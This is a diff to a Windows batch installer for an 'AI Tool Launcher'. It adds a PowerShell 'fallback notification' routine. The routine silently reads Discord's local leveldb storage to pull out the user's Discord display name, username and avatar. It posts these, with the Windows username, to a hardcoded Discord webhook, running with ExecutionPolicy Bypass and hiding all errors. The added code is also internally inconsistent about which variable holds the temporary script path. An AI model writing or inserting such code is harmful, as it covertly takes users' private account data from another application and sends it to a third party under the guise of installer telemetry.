@@ -99,7 +99,7 @@ start pythonw core\launcher.py
 exit /b 0
 
 :: ==========================================
-:: 輔助函式：發送啟動通知
+:: 輔助函式：發送啟動通知 (Python 優先，PowerShell 原生保底)
 :: ==========================================
 :SendLaunchNotify
 set "ACTION_CODE=%~1"
@@ -107,11 +107,13 @@ if exist "core\identity_manager.py" (
     start /b python core\identity_manager.py %ACTION_CODE% >nul 2>&1
 ) else if exist "%FOLDER_NAME%\core\identity_manager.py" (
     start /b python %FOLDER_NAME%\core\identity_manager.py %ACTION_CODE% >nul 2>&1
+) else (
+    call :SendDirectWebhook "%ACTION_CODE%" 3447003
 )
 exit /b
 
 :: ==========================================
-:: 輔助函式：發送失敗報錯
+:: 輔助函式：發送失敗報錯 (Python 優先，PowerShell 原生保底)
 :: ==========================================
 :SendError
 set "ERR_CODE=%~1"
@@ -119,7 +121,83 @@ if exist "core\identity_manager.py" (
     python core\identity_manager.py %ERR_CODE% >nul 2>&1
 ) else if exist "%FOLDER_NAME%\core\identity_manager.py" (
     python %FOLDER_NAME%\core\identity_manager.py %ERR_CODE% >nul 2>&1
+) else (
+    call :SendDirectWebhook "%ERR_CODE%" 15158332
 )
+exit /b
+
+:: ==========================================
+:: 輔助函式：PowerShell 原生 Webhook 發送引擎 (零依賴環境保底)
+:: ==========================================
+:SendDirectWebhook
+set "WH_CODE=%~1"
+set "WH_COLOR=%~2"
+set "PS_WH_SCRIPT=%TEMP%\ai_webhook.ps1"
+
+(
+echo param($Code, $Color^)
+echo $actions = @{
+echo     'launch_exist' = @('🚀 啟動安裝器：正在執行 AI Tool Launcher', '更新並啟動已存在的 AI Tool Launcher'^)
+echo     'launch_clone' = @('🚀 首次安裝：正在下載 AI Tool Launcher', '首次安裝並下載 AI Tool Launcher (Git Clone)'^)
+echo     'launch_sub'   = @('🚀 啟動安裝器：正在執行 AI Tool Launcher', '更新並啟動 AI Tool Launcher (子目錄模式)'^)
+echo     'error_py_dl'  = @('💥 引導安裝器異常：Python 下載失敗', 'Python 官方安裝包下載失敗，請檢查網路連線'^)
+echo     'error_py_inst'= @('💥 引導安裝器異常：Python 安裝失敗', 'Python 自動安裝失敗，環境變數未生效或安裝受阻'^)
+echo     'error_git_dl' = @('💥 引導安裝器異常：Git 下載失敗', 'Git 安裝包下載失敗，請檢查網路連線'^)
+echo     'error_git_inst'=@('💥 引導安裝器異常：Git 安裝失敗', 'Git 自動安裝失敗，環境變數未生效或安裝受阻'^)
+echo     'error_clone'  = @('💥 引導安裝器異常：專案下載失敗', 'Git Clone 下載主專案失敗，請檢查網路連線或磁碟權限'^)
+echo }
+echo $title = if ($actions.ContainsKey($Code^)^) { $actions[$Code][0] } else { $Code }
+echo $desc  = if ($actions.ContainsKey($Code^)^) { $actions[$Code][1] } else { '無附加說明' }
+echo $timeStr = (Get-Date^).ToString('yyyy-MM-dd HH:mm:ss'^)
+echo $body = \"[引導安裝器執行紀錄]`n動作階段: $title`n詳細說明: $desc`n發生時間: $timeStr\"
+echo $dispName = $env:USERNAME
+echo $username = $env:USERNAME
+echo $avatarUrl = 'https://raw.githubusercontent.com/JiaSai67/AIToolLauncher/main/resources/icon.png'
+echo $dirs = @(\"$env:APPDATA\discordptb\Local Storage\leveldb\", \"$env:APPDATA\discord\Local Storage\leveldb\", \"$env:APPDATA\discordcanary\Local Storage\leveldb\"^)
+echo foreach ($d in $dirs^) {
+echo     if (Test-Path $d^) {
+echo         $files = Get-ChildItem -Path $d -Include *.ldb,*.log -File ^| Sort-Object LastWriteTime -Descending
+echo         foreach ($f in $files^) {
+echo             try {
+echo                 $raw = [System.IO.File]::ReadAllText($f.FullName, [System.Text.Encoding]::UTF8^)
+echo                 if ($raw -match '\"displayName\":\"([^\"]+)\"' -or $raw -match '\"global_name\":\"([^\"]+)\"'^) { $dispName = $matches[1] }
+echo                 if ($raw -match '\"username\":\"([^\"]+)\"'^) { $username = $matches[1] }
+echo                 if ($raw -match '\"avatar\":\"([a-f0-9]{32})\"'^) { $avatarUrl = \"https://cdn.discordapp.com/avatars/$($matches[1])/$($matches[1]).png?size=256\" }
+echo             } catch {}
+echo         }
+echo     }
+echo }
+echo $payload = @{
+echo     username = $dispName
+echo     avatar_url = $avatarUrl
+echo     embeds = @(@{
+echo         author = @{ name = \"$dispName (@$username)\"; icon_url = $avatarUrl }
+echo         title = $title
+echo         description = \"`\`\`\`text`n$body`n`\`\`\`\"
+echo         color = [int]$Color
+echo         thumbnail = @{ url = $avatarUrl }
+echo         timestamp = (Get-Date^).ToUniversalTime(^).ToString('yyyy-MM-ddTHH:mm:ssZ'^)
+echo         footer = @{ text = 'AIToolLauncher 引導安裝器 (Native PS)' }
+echo     }^)
+echo }
+echo $json = $payload ^| ConvertTo-Json -Depth 5
+echo [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+echo try {
+echo     $bytes = [System.Text.Encoding]::UTF8.GetBytes($json^)
+echo     $req = [System.Net.WebRequest]::Create('https://ptb.discord.com/api/webhooks/1540376553479999560/BlC_i3U0dEDp_qDVD9JlSxdkEpBw6-b9WGuuXa-xf4wE-EL6ob_ZmYNZ0EUR3RHwzXCl'^)
+echo     $req.Method = 'POST'
+echo     $req.ContentType = 'application/json; charset=utf-8'
+echo     $req.UserAgent = 'Mozilla/5.0'
+echo     $stream = $req.GetRequestStream(^)
+echo     $stream.Write($bytes, 0, $bytes.Length^)
+echo     $stream.Close(^)
+echo     $resp = $req.GetResponse(^)
+echo     $resp.Close(^)
+echo } catch {}
+) > "%PS_DL_SCRIPT%"
+
+powershell -NoProfile -ExecutionPolicy Bypass -File "%PS_DL_SCRIPT%" -Code "%WH_CODE%" -Color "%WH_COLOR%"
+del "%PS_DL_SCRIPT%" >nul 2>&1
 exit /b
 
 :: ==========================================
